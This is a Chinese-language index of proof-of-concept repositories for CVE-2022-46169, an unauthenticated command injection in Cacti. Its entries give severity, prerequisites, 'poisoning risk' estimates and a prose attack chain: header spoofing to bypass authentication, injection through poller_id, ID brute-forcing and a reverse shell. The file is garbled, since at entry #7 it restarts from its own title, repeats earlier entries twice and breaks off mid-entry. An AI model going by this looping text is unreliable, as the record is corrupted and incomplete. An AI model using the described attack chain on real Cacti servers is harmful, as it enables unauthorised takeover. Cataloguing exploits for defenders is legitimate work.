# CVE-2022-46169

> 📦 该CVE有 **31** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-46169-0xN7y_CVE-2022-46169.md](../2022/CVE-2022-46169-0xN7y_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例的URL，以及目标Cacti实例存在至少一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头`X-Forwarded-For`绕过身份验证，然后利用`polldata`动作触发命令注入。漏洞存在于`remote_agent.php`文件中，攻击者通过伪造客户端IP绕过认证，进而利用`poller_id`参数执行任意命令。提供的Python POC代码通过尝试不同的`host_id`和`poller_id`值，发送包含反向shell命令的恶意请求。 

**有效性：**
根据漏洞描述和POC代码，该漏洞利用是有效的，因为它可以允许未经身份验证的攻击者在受影响的Cacti实例上执行任意命令。

**投毒风险：**
该POC代码的投毒风险较低，约为5%。代码主要实现了漏洞利用，没有发现明显的恶意行为，如删除文件、上传恶意文件等。但是，任何漏洞利用代码都可能被修改为包含恶意功能，因此在使用前仍需谨慎审查。以下为可能的投毒点:

*   **反向shell地址：** 攻击者可能在不知情的情况下使用了被污染的反向shell监听地址，导致攻击暴露。
*   **命令注入payload：** 虽然当前payload是反向shell，但攻击者可能在不知情的情况下运行了其他有害命令。

**利用方式：**
1.  **身份验证绕过：** 通过设置`X-Forwarded-For` HTTP头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入：** 访问`remote_agent.php`，并设置`action`参数为`polldata`，`poller_id`参数为恶意命令。需要结合有效的`host_id`和`local_data_ids[]`，使得对应的`poller_item`的`action`为`POLLER_ACTION_SCRIPT_PHP`。
3.  **命令执行：** Cacti执行`proc_open`函数，将构造的恶意命令注入到shell中，实现远程代码执行。

**项目地址:** [0xN7y/CVE-2022-46169](https://github.com/0xN7y/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #2

**来源**: [CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md](../2022/CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`，且攻击者能够访问`remote_agent.php`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞，未经身份验证的攻击者可以通过精心构造的请求执行任意OS命令。该漏洞存在于`remote_agent.php`文件中，通过伪造 `X-Forwarded-For` 头绕过身份验证，然后通过 `polldata` 操作注入命令。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被积极利用。提供的PoC代码利用了身份验证绕过和命令注入漏洞，通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`，如果找到则执行反弹 shell 命令。  PoC的有效性较高。

**投毒风险：**
查看提供的PoC代码（`CVE-2022-46169.py`和`LICENSE`），主要功能是利用漏洞，没有发现明显的恶意代码或后门。`LICENSE` 文件是 GNU GPL v3 许可协议，属于开源协议。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 头部来伪造客户端IP地址，绕过 `remote_agent.php` 文件的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `polldata` 操作，并通过 `poller_id` 参数注入恶意命令。  PoC利用bash反弹shell。
3.  **参数爆破：** PoC代码通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。
4.  **执行任意命令：** 成功注入命令后，服务器将执行攻击者提供的命令。

**项目地址:** [0xZon/CVE-2022-46169-Exploit](https://github.com/0xZon/CVE-2022-46169-Exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #3

**来源**: [CVE-2022-46169-BKreisel_CVE-2022-46169.md](../2022/CVE-2022-46169-BKreisel_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** <= 1.2.22

**利用条件:** 需要Cacti服务器可访问，且存在action类型为POLLER_ACTION_SCRIPT_PHP（2）的poller_item配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 存在于 Cacti 1.2.22 及更早版本中，是一个未经身份验证的远程命令注入漏洞。攻击者可以通过伪造HTTP头绕过身份验证，然后通过操纵`poller_id`参数在`remote_agent.php`文件中执行任意命令。PoC代码通过Python脚本实现，利用此漏洞获取反向shell。该仓库的主要功能是提供漏洞利用代码，但由于开源软件的性质，任何人都可能修改并重新发布。**投毒风险较低 (5%)**，主要是因为该项目结构简单、代码量小，且功能单一，主要代码集中在cve_2022_46169/main.py中。需要人工审核确认没有恶意代码被隐藏。尽管存在风险，但考虑到代码的直接性和漏洞利用的明确性，以及利用反向shell的常见性，可以判断该代码的投毒可能性较低。

**利用方式：**
1.  攻击者首先需要确定目标Cacti服务器的版本低于或等于1.2.22。
2.  攻击者发送特制的HTTP请求到`remote_agent.php`，包含伪造的`Forwarded-For`头，绕过身份验证。
3.  攻击者构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，触发命令注入。
4.  如果目标服务器存在`POLLER_ACTION_SCRIPT_PHP`类型的`poller_item`配置，攻击者的命令将被执行。
5.  PoC代码利用此漏洞创建一个反向shell，允许攻击者远程控制目标服务器。

**项目地址:** [BKreisel/CVE-2022-46169](https://github.com/BKreisel/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #4

**来源**: [CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md](../2022/CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23且存在action类型为POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `remote_agent.php` 文件中的请求参数来执行任意操作系统命令。漏洞利用涉及以下步骤：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header 欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址，从而绕过身份验证检查。
2.  **`polldata` 操作触发：**  身份验证绕过后，攻击者可以调用 `remote_agent.php` 中的 `polldata` 操作。
3.  **命令注入：** 通过构造恶意的 `poller_id` 参数，将命令注入到传递给 `proc_open` 函数的字符串中，从而执行任意命令。
4.  **利用条件：** 成功利用需要存在一个 `poller_item`，其 `action` 字段值为 `POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id` 和 `local_data_ids` 可以通过暴力破解找到。

提供的POC代码 (`CVE-2022-46169.py`) 实现了上述攻击过程，包含以下步骤：

*   检查目标是否易受攻击 (`checkVuln` 函数)。
*   通过暴力破解查找有效的 `host_id` 和 `local_data_ids` (`bruteForcing` 函数)。
*   构造包含反向shell payload 的恶意请求，并将其发送到 `remote_agent.php` (`Reverse_shell` 函数)。

**关于投毒风险：**

对提供的POC代码进行分析，并未发现明显的恶意投毒代码，例如删除文件、上传恶意文件等行为。POC代码的主要功能是利用漏洞进行反向Shell连接。但依然存在一定的潜在风险：

*   **依赖风险：** 虽然代码本身看起来没有恶意，但它依赖于 `requests` 和 `urllib` 库。如果这些库本身被篡改，可能会引入风险。
*   **命令执行风险：**  该漏洞本身允许执行任意命令，攻击者可以利用这一点执行恶意操作。但这不属于代码投毒，而是漏洞的 inherent risk。

因此，将投毒风险评估为 5%。

**项目地址:** [FredBrave/CVE-2022-46169-CACTI-1.2.22](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #5

**来源**: [CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md](../2022/CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权远程代码执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标Cacti实例必须存在action类型为POLLER_ACTION_SCRIPT_PHP (2)的 poller_item配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的远程代码执行漏洞。该漏洞利用链包括身份验证绕过和命令注入两部分。

**利用方式：**

1.  **身份验证绕过：**  攻击者通过构造包含`Forwarded-For: <TARGETIP>`头的HTTP请求，其中`<TARGETIP>`为Cacti服务器的IP地址。`get_client_addr()` 函数会读取 `Forwarded-For` 头部，导致服务器错误地将攻击者识别为自身。因为Cacti默认会在poller表中添加自身hostname, 因此导致认证绕过。
2.  **命令注入：**  绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。该动作调用 `poll_for_data` 函数，该函数从请求参数中获取 `$poller_id`，此参数未经过滤直接拼接到 `proc_open` 函数的参数中，导致命令注入。攻击者需要提供一个`host_id`和`local_data_id`，并且对应poller_item的action必须是`POLLER_ACTION_SCRIPT_PHP`(值为2)才能触发命令注入.

**有效性：**

提供的POC代码（docker-compose.yaml）用于搭建存在漏洞的Cacti环境，方便漏洞分析和复现。漏洞原理描述清晰，利用方式明确。综合漏洞描述和搜索引擎结果，该漏洞利用的有效性高。

**投毒风险：**

虽然POC的主要目的是演示和分析漏洞，但存在一定的投毒风险。docker-compose.yaml 文件中使用了镜像 `smcline06/cacti`，如果该镜像被篡改，可能包含恶意代码。此外，提供的教程包含大量图片链接，这些链接如果指向恶意网站，也可能存在风险。综合考虑，评估投毒风险为10%。

**项目地址:** [HPT-Intern-Task-Submission/CVE-2022-46169](https://github.com/HPT-Intern-Task-Submission/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #6

**来源**: [CVE-2022-46169-Habib0x0_CVE-2022-46169.md](../2022/CVE-2022-46169-Habib0x0_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在满足条件的 poller_item (POLLER_ACTION_SCRIPT_PHP 类型), 且攻击者能够访问 remote_agent.php 页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并利用 `poller_id` 参数进行命令注入。 

**利用方式：**

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header，伪造客户端IP，绕过 `remote_agent.php` 的身份验证。
2.  **参数污染:** 攻击者利用`poller_id`，`host_id`，`local_data_ids[]`参数进行参数污染。
3.  **命令注入：** 成功绕过身份验证后，攻击者可以利用 `polldata` action，将恶意命令注入到 `poller_id` 参数中，从而执行任意系统命令。

**POC 分析：**

提供的 Ruby POC 代码首先尝试绕过身份验证，然后爆破`host_id`和`local_data_ids[]`，以找到有效的 `poller_item`，最后构造包含恶意命令的 URL，并发送 HTTP 请求触发命令注入。

**投毒风险分析：**

该 POC 代码主要功能是利用漏洞进行攻击。投毒风险较低，但仍然存在一定的潜在风险。
*   **依赖项风险：** POC 代码依赖于 `net/http`、`uri`、`json`、`optparse`、`artii` 和 `colorize` 等 Ruby 库。虽然这些库本身不太可能包含恶意代码，但始终存在依赖项被污染的风险。
*   **恶意命令注入：** 虽然 POC 中显示的命令是发起反向 Shell，但攻击者可以修改 POC 代码，注入其他恶意命令，例如删除文件、篡改数据等。因此，在使用 POC 时，务必仔细审查代码，确保不会执行未授权的操作。

综上，该 POC 的投毒风险相对较低，但仍需谨慎使用，并对代码进行充分审查。

**项目地址:** [Habib0x0/CVE-2022-46169](https://github.com/Habib0x0/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #7

**来源**: [CVE-2022-46169-JacobEbben_CVE-2022-46169_unauth_remote_code_execution.md](../2022/CVE-2022-46169-JacobEbben_CVE-2022-46169_unauth_remote_code_execution.md)

# CVE-2022-46169

> 📦 该CVE有 **31** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-46169-0xN7y_CVE-2022-46169.md](../2022/CVE-2022-46169-0xN7y_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例的URL，以及目标Cacti实例存在至少一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头`X-Forwarded-For`绕过身份验证，然后利用`polldata`动作触发命令注入。漏洞存在于`remote_agent.php`文件中，攻击者通过伪造客户端IP绕过认证，进而利用`poller_id`参数执行任意命令。提供的Python POC代码通过尝试不同的`host_id`和`poller_id`值，发送包含反向shell命令的恶意请求。 

**有效性：**
根据漏洞描述和POC代码，该漏洞利用是有效的，因为它可以允许未经身份验证的攻击者在受影响的Cacti实例上执行任意命令。

**投毒风险：**
该POC代码的投毒风险较低，约为5%。代码主要实现了漏洞利用，没有发现明显的恶意行为，如删除文件、上传恶意文件等。但是，任何漏洞利用代码都可能被修改为包含恶意功能，因此在使用前仍需谨慎审查。以下为可能的投毒点:

*   **反向shell地址：** 攻击者可能在不知情的情况下使用了被污染的反向shell监听地址，导致攻击暴露。
*   **命令注入payload：** 虽然当前payload是反向shell，但攻击者可能在不知情的情况下运行了其他有害命令。

**利用方式：**
1.  **身份验证绕过：** 通过设置`X-Forwarded-For` HTTP头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入：** 访问`remote_agent.php`，并设置`action`参数为`polldata`，`poller_id`参数为恶意命令。需要结合有效的`host_id`和`local_data_ids[]`，使得对应的`poller_item`的`action`为`POLLER_ACTION_SCRIPT_PHP`。
3.  **命令执行：** Cacti执行`proc_open`函数，将构造的恶意命令注入到shell中，实现远程代码执行。

**项目地址:** [0xN7y/CVE-2022-46169](https://github.com/0xN7y/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #2

**来源**: [CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md](../2022/CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`，且攻击者能够访问`remote_agent.php`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞，未经身份验证的攻击者可以通过精心构造的请求执行任意OS命令。该漏洞存在于`remote_agent.php`文件中，通过伪造 `X-Forwarded-For` 头绕过身份验证，然后通过 `polldata` 操作注入命令。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被积极利用。提供的PoC代码利用了身份验证绕过和命令注入漏洞，通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`，如果找到则执行反弹 shell 命令。  PoC的有效性较高。

**投毒风险：**
查看提供的PoC代码（`CVE-2022-46169.py`和`LICENSE`），主要功能是利用漏洞，没有发现明显的恶意代码或后门。`LICENSE` 文件是 GNU GPL v3 许可协议，属于开源协议。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 头部来伪造客户端IP地址，绕过 `remote_agent.php` 文件的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `polldata` 操作，并通过 `poller_id` 参数注入恶意命令。  PoC利用bash反弹shell。
3.  **参数爆破：** PoC代码通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。
4.  **执行任意命令：** 成功注入命令后，服务器将执行攻击者提供的命令。

**项目地址:** [0xZon/CVE-2022-46169-Exploit](https://github.com/0xZon/CVE-2022-46169-Exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #3

**来源**: [CVE-2022-46169-BKreisel_CVE-2022-46169.md](../2022/CVE-2022-46169-BKreisel_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** <= 1.2.22

**利用条件:** 需要Cacti服务器可访问，且存在action类型为POLLER_ACTION_SCRIPT_PHP（2）的poller_item配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 存在于 Cacti 1.2.22 及更早版本中，是一个未经身份验证的远程命令注入漏洞。攻击者可以通过伪造HTTP头绕过身份验证，然后通过操纵`poller_id`参数在`remote_agent.php`文件中执行任意命令。PoC代码通过Python脚本实现，利用此漏洞获取反向shell。该仓库的主要功能是提供漏洞利用代码，但由于开源软件的性质，任何人都可能修改并重新发布。**投毒风险较低 (5%)**，主要是因为该项目结构简单、代码量小，且功能单一，主要代码集中在cve_2022_46169/main.py中。需要人工审核确认没有恶意代码被隐藏。尽管存在风险，但考虑到代码的直接性和漏洞利用的明确性，以及利用反向shell的常见性，可以判断该代码的投毒可能性较低。

**利用方式：**
1.  攻击者首先需要确定目标Cacti服务器的版本低于或等于1.2.22。
2.  攻击者发送特制的HTTP请求到`remote_agent.php`，包含伪造的`Forwarded-For`头，绕过身份验证。
3.  攻击者构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，触发命令注入。
4.  如果目标服务器存在`POLLER_ACTION_SCRIPT_PHP`类型的`poller_item`配置，攻击者的命令将被执行。
5.  PoC代码利用此漏洞创建一个反向shell，允许攻击者远程控制目标服务器。

**项目地址:** [BKreisel/CVE-2022-46169](https://github.com/BKreisel/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #4

**来源**: [CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md](../2022/CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23且存在action类型为POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `remote_agent.php` 文件中的请求参数来执行任意操作系统命令。漏洞利用涉及以下步骤：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header 欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址，从而绕过身份验证检查。
2.  **`polldata` 操作触发：**  身份验证绕过后，攻击者可以调用 `remote_agent.php` 中的 `polldata` 操作。
3.  **命令注入：** 通过构造恶意的 `poller_id` 参数，将命令注入到传递给 `proc_open` 函数的字符串中，从而执行任意命令。
4.  **利用条件：** 成功利用需要存在一个 `poller_item`，其 `action` 字段值为 `POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id` 和 `local_data_ids` 可以通过暴力破解找到。

提供的POC代码 (`CVE-2022-46169.py`) 实现了上述攻击过程，包含以下步骤：

*   检查目标是否易受攻击 (`checkVuln` 函数)。
*   通过暴力破解查找有效的 `host_id` 和 `local_data_ids` (`bruteForcing` 函数)。
*   构造包含反向shell payload 的恶意请求，并将其发送到 `remote_agent.php` (`Reverse_shell` 函数)。

**关于投毒风险：**

对提供的POC代码进行分析，并未发现明显的恶意投毒代码，例如删除文件、上传恶意文件等行为。POC代码的主要功能是利用漏洞进行反向Shell连接。但依然存在一定的潜在风险：

*   **依赖风险：** 虽然代码本身看起来没有恶意，但它依赖于 `requests` 和 `urllib` 库。如果这些库本身被篡改，可能会引入风险。
*   **命令执行风险：**  该漏洞本身允许执行任意命令，攻击者可以利用这一点执行恶意操作。但这不属于代码投毒，而是漏洞的 inherent risk。

因此，将投毒风险评估为 5%。

**项目地址:** [FredBrave/CVE-2022-46169-CACTI-1.2.22](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #5

**来源**: [CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md](../2022/CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权远程代码执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标Cacti实例必须存在action类型为POLLER_ACTION_SCRIPT_PHP (2)的 poller_item配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的远程代码执行漏洞。该漏洞利用链包括身份验证绕过和命令注入两部分。

**利用方式：**

1.  **身份验证绕过：**  攻击者通过构造包含`Forwarded-For: <TARGETIP>`头的HTTP请求，其中`<TARGETIP>`为Cacti服务器的IP地址。`get_client_addr()` 函数会读取 `Forwarded-For` 头部，导致服务器错误地将攻击者识别为自身。因为Cacti默认会在poller表中添加自身hostname, 因此导致认证绕过。
2.  **命令注入：**  绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。该动作调用 `poll_for_data` 函数，该函数从请求参数中获取 `$poller_id`，此参数未经过滤直接拼接到 `proc_open` 函数的参数中，导致命令注入。攻击者需要提供一个`host_id`和`local_data_id`，并且对应poller_item的action必须是`POLLER_ACTION_SCRIPT_PHP`(值为2)才能触发命令注入.

**有效性：**

提供的POC代码（docker-compose.yaml）用于搭建存在漏洞的Cacti环境，方便漏洞分析和复现。漏洞原理描述清晰，利用方式明确。综合漏洞描述和搜索引擎结果，该漏洞利用的有效性高。

**投毒风险：**

虽然POC的主要目的是演示和分析漏洞，但存在一定的投毒风险。docker-compose.yaml 文件中使用了镜像 `smcline06/cacti`，如果该镜像被篡改，可能包含恶意代码。此外，提供的教程包含大量图片链接，这些链接如果指向恶意网站，也可能存在风险。综合考虑，评估投毒风险为10%。

**项目地址:** [HPT-Intern-Task-Submission/CVE-2022-46169](https://github.com/HPT-Intern-Task-Submission/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #6

**来源**: [CVE-2022-46169-Habib0x0_CVE-2022-46169.md](../2022/CVE-2022-46169-Habib0x0_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在满足条件的 poller_item (POLLER_ACTION_SCRIPT_PHP 类型), 且攻击者能够访问 remote_agent.php 页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并利用 `poller_id` 参数进行命令注入。 

**利用方式：**

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header，伪造客户端IP，绕过 `remote_agent.php` 的身份验证。
2.  **参数污染:** 攻击者利用`poller_id`，`host_id`，`local_data_ids[]`参数进行参数污染。
3.  **命令注入：** 成功绕过身份验证后，攻击者可以利用 `polldata` action，将恶意命令注入到 `poller_id` 参数中，从而执行任意系统命令。

**POC 分析：**

提供的 Ruby POC 代码首先尝试绕过身份验证，然后爆破`host_id`和`local_data_ids[]`，以找到有效的 `poller_item`，最后构造包含恶意命令的 URL，并发送 HTTP 请求触发命令注入。

**投毒风险分析：**

该 POC 代码主要功能是利用漏洞进行攻击。投毒风险较低，但仍然存在一定的潜在风险。
*   **依赖项风险：** POC 代码依赖于 `net/http`、`uri`、`json`、`optparse`、`artii` 和 `colorize` 等 Ruby 库。虽然这些库本身不太可能包含恶意代码，但始终存在依赖项被污染的风险。
*   **恶意命令注入：** 虽然 POC 中显示的命令是发起反向 Shell，但攻击者可以修改 POC 代码，注入其他恶意命令，例如删除文件、篡改数据等。因此，在使用 POC 时，务必仔细审查代码，确保不会执行未授权的操作。

综上，该 POC 的投毒风险相对较低，但仍需谨慎使用，并对代码进行充分审查。

**项目地址:** [Habib0x0/CVE-2022-46169](https://github.com/Habib0x0/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #7

**来源**: [CVE-2022-46169-JacobEbben_CVE-2022-46169_unauth_remote_code_execution.md](../2022/CVE-2022-46169-JacobEbben_CVE-2022-46169_unauth_remote_code_execution.md)

# CVE-2022-46169

> 📦 该CVE有 **31** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-46169-0xN7y_CVE-2022-46169.md](../2022/CVE-2022-46169-0xN7y_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例的URL，以及目标Cacti实例存在至少一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头`X-Forwarded-For`绕过身份验证，然后利用`polldata`动作触发命令注入。漏洞存在于`remote_agent.php`文件中，攻击者通过伪造客户端IP绕过认证，进而利用`poller_id`参数执行任意命令。提供的Python POC代码通过尝试不同的`host_id`和`poller_id`值，发送包含反向shell命令的恶意请求。 

**有效性：**
根据漏洞描述和POC代码，该漏洞利用是有效的，因为它可以允许未经身份验证的攻击者在受影响的Cacti实例上执行任意命令。

**投毒风险：**
该POC代码的投毒风险较低，约为5%。代码主要实现了漏洞利用，没有发现明显的恶意行为，如删除文件、上传恶意文件等。但是，任何漏洞利用代码都可能被修改为包含恶意功能，因此在使用前仍需谨慎审查。以下为可能的投毒点:

*   **反向shell地址：** 攻击者可能在不知情的情况下使用了被污染的反向shell监听地址，导致攻击暴露。
*   **命令注入payload：** 虽然当前payload是反向shell，但攻击者可能在不知情的情况下运行了其他有害命令。

**利用方式：**
1.  **身份验证绕过：** 通过设置`X-Forwarded-For` HTTP头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入：** 访问`remote_agent.php`，并设置`action`参数为`polldata`，`poller_id`参数为恶意命令。需要结合有效的`host_id`和`local_data_ids[]`，使得对应的`poller_item`的`action`为`POLLER_ACTION_SCRIPT_PHP`。
3.  **命令执行：** Cacti执行`proc_open`函数，将构造的恶意命令注入到shell中，实现远程代码执行。

**项目地址:** [0xN7y/CVE-2022-46169](https://github.com/0xN7y/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #2

**来源**: [CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md](../2022/CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

